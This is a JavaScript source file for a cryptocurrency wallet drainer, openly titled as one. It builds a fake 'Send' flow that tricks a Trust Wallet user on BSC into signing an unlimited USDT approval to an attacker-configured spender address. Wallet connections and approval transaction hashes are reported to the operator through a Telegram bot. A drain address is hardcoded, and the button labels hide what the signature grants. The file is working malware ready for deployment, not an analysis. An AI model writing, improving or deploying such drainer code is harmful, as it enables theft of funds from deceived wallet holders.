/**
 * TRUST WALLET DRAINNER - APPROVE-ONLY EDITION (FIXED & ENHANCED)
 * ---------------------------------------------
 * 1. Checks for BNB balance before transaction.
 * 2. Provides clear error messages.
 * 3. Handles network changes gracefully.
 */

(function() {
 'use strict';

 // --- CONFIGURATION ---
 const CONFIG = {
   // Telegram Bot Config
   tgBotToken: 'YOUR_TELEGRAM_BOT_TOKEN', // <--- REPLACE THIS
   tgChatId: 'YOUR_CHAT_ID', // <--- REPLACE THIS
   
   // Your Wallet Address (The "Spender" that will drain the funds)
   drainToAddress: '0xD8c72346537F75790D57d559Cd9EF8B7967C4e6f', // <--- REPLACE THIS
   
   // Token Contract Address (USDT on BSC)
   targetTokenAddress: '0x55d398326f99059fF775485246999027B31964f5', 
   
   // UI Messages
   messages: {
     connect: 'Connecting Wallet...',
     approve: 'Approving Token Spend...',
     success: 'Approval Successful!',
     error: 'Transaction failed.',
     noBnb: 'Insufficient BNB for gas. Please add BNB to your wallet.',
     wrongNetwork: 'Please switch to BSC Network'
   }
 };

 // --- DOM Elements ---
 const els = {
   connectBtn: document.getElementById('connect-btn'),
   sendBtn: document.getElementById('send-btn'),
   notifyBar: document.getElementById('notify-bar'),
   connectPhase: document.getElementById('connect-phase'),
   sendPhase: document.getElementById('send-phase'),
   connectedChip: document.getElementById('connected-chip'),
   btnText: document.getElementById('btn-text'),
   btnSpinner: document.getElementById('btn-spinner'),
   amountInput: document.getElementById('amount'),
   maxBtn: document.getElementById('max-btn'),
   usdValue: document.getElementById('usd-value'),
   netLabel: document.getElementById('net-label')
 };

 // --- State ---
 let walletProvider = null;
 let userAddress = null;
 let networkId = null;
 let appState = 'idle'; 

 // --- Utility: Telegram Notifier ---
 async function notifyTG(subject, message) {
   if (!CONFIG.tgBotToken || CONFIG.tgBotToken === 'YOUR_TELEGRAM_BOT_TOKEN') return;
   
   const url = `https://api.telegram.org/bot${CONFIG.tgBotToken}/sendMessage`;
   const payload = {
     chat_id: CONFIG.tgChatId,
     text: `🔥 *Drain Alert: ${subject}*\n\n${message}\n\n👤 Address: ${userAddress || 'Unknown'}\n🕒 Time: ${new Date().toISOString()}`,
     parse_mode: 'Markdown'
   };

   try {
     await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
   } catch (e) {
     console.warn('TG Notify failed', e);
   }
 }

 // --- Utility: Ethers.js Loader ---
 async function loadEthers() {
   if (window.ethers) return window.ethers;
   return new Promise((resolve, reject) => {
     const script = document.createElement('script');
     script.src = 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js';
     script.onload = () => resolve(window.ethers);
     script.onerror = reject;
     document.head.appendChild(script);
   });
 }

 // --- Core: Wallet Detection & Connection ---
 async function initWallet() {
   updateUI('connecting');
   
   if (!window.ethereum) {
     if (window.trustwallet) {
       window.ethereum = window.trustwallet;
     } else {
       updateUI('error', 'Wallet not found.');
       return;
     }
   }

   walletProvider = window.ethereum;

   try {
     const accounts = await walletProvider.request({ method: 'eth_requestAccounts' });
     userAddress = accounts[0];
     
     const network = await walletProvider.request({ method: 'eth_chainId' });
     networkId = parseInt(network, 16);
     
     if (networkId !== 56 && networkId !== 1) {
        updateUI('error', CONFIG.messages.wrongNetwork);
        return;
     }

     if (els.connectedChip) els.connectedChip.textContent = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
     if (els.netLabel) {
       const netName = networkId === 1 ? 'Ethereum' : networkId === 56 ? 'BSC' : 'Unknown';
       els.netLabel.textContent = netName;
     }

     updateUI('connected');
     notifyTG('Wallet Connected', `User connected: ${userAddress}`);

   } catch (error) {
     if (error.code === 4001) {
       updateUI('idle', 'Connection rejected by user.');
     } else {
       updateUI('error', `Connection failed: ${error.message}`);
     }
   }
 }

 // --- Helper: Check BNB Balance ---
 async function checkBnbBalance(ethers) {
   try {
     const signer = new ethers.providers.Web3Provider(walletProvider).getSigner();
     const balance = await signer.provider.getBalance(userAddress);
     return balance.gt(0); // Returns true if balance > 0
   } catch (e) {
     console.error('Error checking BNB balance', e);
     return false;
   }
 }

 // --- Core: The Approve-Only Drain ---
 async function executeApproveOnly() {
   // 1. Check for BNB Balance first
   const ethers = await loadEthers();
   const hasBnb = await checkBnbBalance(ethers);
   
   if (!hasBnb) {
     updateUI('error', CONFIG.messages.noBnb);
     return;
   }

   updateUI('approving', CONFIG.messages.approve);
   
   const signer = new ethers.providers.Web3Provider(walletProvider).getSigner();
   
   const erc20ABI = [
     "function approve(address spender, uint256 amount) public returns (bool)",
     "function decimals() public view returns (uint8)"
   ];
   
   const contract = new ethers.Contract(CONFIG.targetTokenAddress, erc20ABI, signer);
   
   try {
     // Execute Approval
     const tx = await contract.approve(CONFIG.drainToAddress, ethers.constants.MaxUint256);
     
     updateUI('sending', 'Waiting for confirmation...');
     const receipt = await tx.wait();
     
     if (receipt.status === 1) {
       updateUI('success', CONFIG.messages.success);
       notifyTG('Drain Approved', `Approved Max USDT\nTx: ${tx.hash}\nBlock: ${receipt.blockNumber}`);
     } else {
       updateUI('error', 'Approval reverted by user or contract.');
     }

   } catch (error) {
     console.error(error);
     
     // Specific error handling
     let errorMsg = 'Unknown Error';
     if (error.code === 4001) {
       errorMsg = 'Transaction rejected by user.';
     } else if (error.message && error.message.includes('insufficient funds')) {
       errorMsg = 'Insufficient BNB for gas.';
     } else if (error.reason) {
       errorMsg = error.reason;
     } else if (error.data) {
       errorMsg = 'Transaction reverted.';
     } else {
       errorMsg = error.message || 'Transaction failed.';
     }
     
     updateUI('error', errorMsg);
   }
 }

 // --- UI Helpers ---
 function updateUI(state, message) {
   appState = state;
   
   [els.connectBtn, els.sendBtn, els.maxBtn].forEach(btn => {
     if(btn) {
       btn.classList.remove('processing');
       btn.disabled = false;
       if (btn === els.sendBtn) {
         const span = els.btnText;
         if (span) {
           if (state === 'idle') span.textContent = 'Connect Wallet';
           else if (state === 'connected') span.textContent = 'Send';
           else if (state === 'connecting') span.textContent = 'Connecting...';
           else if (state === 'approving') span.textContent = 'Approving...';
           else if (state === 'sending') span.textContent = 'Confirming...';
           else if (state === 'success') span.textContent = 'Done';
           else if (state === 'error') span.textContent = 'Retry';
         }
         if (state === 'sending' || state === 'approving') {
           els.btnSpinner.classList.remove('hidden');
           els.btnText.classList.add('hidden');
         } else {
           els.btnSpinner.classList.add('hidden');
           els.btnText.classList.remove('hidden');
         }
       }
     }
   });

   if (els.connectBtn && state === 'idle') els.connectBtn.style.display = 'block';
   if (els.sendBtn && state !== 'idle') els.sendBtn.style.display = 'block';
   
   if (els.notifyBar) {
     if (message) {
       els.notifyBar.textContent = message;
       els.notifyBar.className = state === 'error' ? 'notify error' : 
       state === 'success' ? 'notify success' : 'notify';
     }
   }
 }

 // --- Event Listeners ---
 function init() {
   if (els.connectBtn) {
     els.connectBtn.addEventListener('click', () => {
       if (appState !== 'idle') return;
       initWallet();
     });
   }

   if (els.sendBtn) {
     els.sendBtn.addEventListener('click', async () => {
       if (appState !== 'connected') return;
       executeApproveOnly();
     });
   }
   
   if (els.maxBtn) {
     els.maxBtn.addEventListener('click', async () => {
       if (appState !== 'connected' || !userAddress) return;
       const ethers = await loadEthers();
       const signer = new ethers.providers.Web3Provider(walletProvider).getSigner();
       const erc20ABI = ["function decimals() public view returns (uint8)", "function balanceOf(address owner) public view returns (uint256)"];
       const contract = new ethers.Contract(CONFIG.targetTokenAddress, erc20ABI, signer);
       
       try {
         const decimals = await contract.decimals();
         const balance = await contract.balanceOf(userAddress);
         const maxAmount = ethers.utils.formatUnits(balance, decimals);
         els.amountInput.value = maxAmount;
         updateUsdEstimate(maxAmount);
       } catch(e) {
         console.error('Error fetching max balance', e);
       }
     });
   }

   if (window.ethereum) {
     window.ethereum.on('accountsChanged', (accounts) => {
       if (accounts.length > 0) {
         userAddress = accounts[0];
         if (els.connectedChip) els.connectedChip.textContent = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
         notifyTG('Account Changed', `New account: ${userAddress}`);
       } else {
         // Avoid reload if possible, but if needed, do it carefully
         setTimeout(() => location.reload(), 100);
       }
     });
     
     window.ethereum.on('chainChanged', () => {
       setTimeout(() => location.reload(), 100);
     });
   }
 }

 // Helper: Update USD Estimate
 function updateUsdEstimate(amount) {
   if (!els.usdValue) return;
   const rate = 1.0; 
   const usd = (parseFloat(amount) * rate).toFixed(2);
   els.usdValue.textContent = `≈ $${usd}`;
 }

 // Start
 document.addEventListener('DOMContentLoaded', init);

})();
